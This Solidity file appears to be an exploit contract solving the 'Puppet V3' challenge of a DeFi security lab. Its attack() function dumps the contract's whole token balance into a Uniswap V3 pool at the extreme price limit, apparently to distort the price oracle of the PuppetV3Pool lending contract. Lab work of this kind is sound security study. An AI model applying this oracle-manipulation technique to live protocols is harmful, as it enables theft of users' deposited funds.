// SPDX-License-Identifier: MIT

pragma solidity =0.7.6;

import "./PuppetV3Pool.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import '@uniswap/v3-core/contracts/libraries/TickMath.sol';
import "hardhat/console.sol";

contract PuppetV3PoolAttacker {

    IERC20Minimal token;
    PuppetV3Pool pool;
    IUniswapV3Pool exchange;

    constructor(address _tokenAddr, address _poolAddr, address _exchangeAddr) payable {
        token = IERC20Minimal(_tokenAddr);
        pool = PuppetV3Pool(_poolAddr);
        exchange = IUniswapV3Pool(_exchangeAddr);
    }

    function attack() public payable {
        int256 tokenBalance = int256(token.balanceOf(address(this)));
        exchange.swap(
            address(this),
            false,
            tokenBalance,
            TickMath.MAX_SQRT_RATIO - 1, // limitPrice
            ""
        );
    }

    // Uniswapv3 requires contracts to implement this callback for swapping.
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata
    ) external {
        if (amount0Delta > 0) {
            IERC20Minimal(IUniswapV3Pool(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));
        } else if (amount1Delta > 0) {
            IERC20Minimal(IUniswapV3Pool(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));
        } else {
            // if both are not gt 0, both must be 0.
            assert(amount0Delta == 0 && amount1Delta == 0);
        }
    }

}
